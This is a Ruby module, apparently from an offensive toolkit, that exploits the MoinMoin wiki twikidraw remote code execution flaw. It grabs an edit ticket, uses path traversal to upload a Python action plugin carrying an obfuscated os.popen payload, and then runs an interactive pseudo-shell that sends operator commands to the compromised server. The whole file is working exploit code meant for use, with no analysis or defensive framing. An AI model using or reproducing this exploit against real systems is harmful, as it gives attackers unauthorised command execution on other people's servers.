# MoinMoin Wiki Items
# Mostly just the known RCE, but maybe more in the future...
# http://i.imgur.com/e8FHrXX.png

class MoinMoin
  def initialize(target, prefix)
    @http = EasyCurb.new
    @target = target
    @prefix = prefix
  end

  # Fetch Ticket
  # Return valid ticket or nil
  def get_ticket
    url = "http://#{@target}/#{@prefix}moin/WikiSandBox?action=twikidraw&do=modify&target=../../../../data/plugin/action/moinexec.py"
    res = @http.get(url)
    if res[0] =~ /ticket=(.*?)&amp;target=/
      @ticket = $1
      return true
    end
    return false
  end

  # Deploy our Command Shell via Plugin
  # Returns path to shell or nil
  def deploy_evil_plugin
    @param = randz(1).downcase
    payload = "drawing.s if()else()\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['#{@param}'])\\56read()\""
    uri = URI.parse("http://#{@target}/#{@prefix}moin/WikiSandBox?action=twikidraw&do=save&ticket=#{@ticket}&target=../../../../data/plugin/action/moinexec.py")

    if $config['HTTP']['PROXY']
      http = Net::HTTP.new(uri.host, uri.port, $config['HTTP']['PROXY_IP'], $config['HTTP']['PROXY_PORT'].to_i)
    else
      http = Net::HTTP.new(uri.host, uri.port)
    end
    request = Net::HTTP::Post.new(uri.request_uri, { "User-Agent" => $config['HTTP']['HTTP_USER_AGENT'] })

    post_body = []
    boundary = randz(12).downcase
    post_body << "--#{boundary}\r\n"
    post_body << "Content-Disposition: form-data; name=\"filename\"\r\nContent-Type: image/png\r\n\r\n#{payload}\r\n--#{boundary}\r\n"
    post_body << "Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\nContent-Type: image/png\r\n\r\nBLAH"
    post_body << "\r\n--#{boundary}--\r\n"
    request.body = post_body.join
    request["Content-Length"] = post_body.join.size
    request["Content-Type"] = "multipart/form-data; boundary=#{boundary}"
    if $config['HTTP']['REF']
      request['Referer'] = $config['HTTP']['REFERER']
    end
    if $config['HTTP']['HTTP_HEADERS_ADD']
      $config['HTTP']['HTTP_HEADERS'].each do |k, v|
        request["#{k}"] = "#{v}"
      end
    end
    if $config['HTTP']['COOKIESUPPORT']
      cookies = File.open($config['HTTP']['COOKIEFILE']).read
      request["Cookie"] = cookies.to_s
    end
    if $config['HTTP']['HTTP_AUTH']
      request.basic_auth $config['HTTP']['HTTP_AUTH_USER'], $config['HTTP']['HTTP_AUTH_PASS']
    end
    response = http.request(request)
    if response.code.to_i == 200
      return @param
    else
      return nil
    end
  end

  # Simple Pseudo Shell
  def pseudo_shell
    puts
    prompt = "(Command)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^cls$|^clear$/i
        cls
        banner
      when /^exit$|^quit$|^back$/i
        print_error("OK, Returning to Main Menu....")
        break
      else
        res = @http.get("http://#{@target}/#{@prefix}moin/WikiSandBox?action=moinexec&#{@param}=#{cmd.gsub(' ', '%20')}")
        if res[0].nil?
          puts
          print_error("No Results Found!\n")
        else
          print_line("\n#{res[0].chomp}")
        end
      end
    end
  end
end
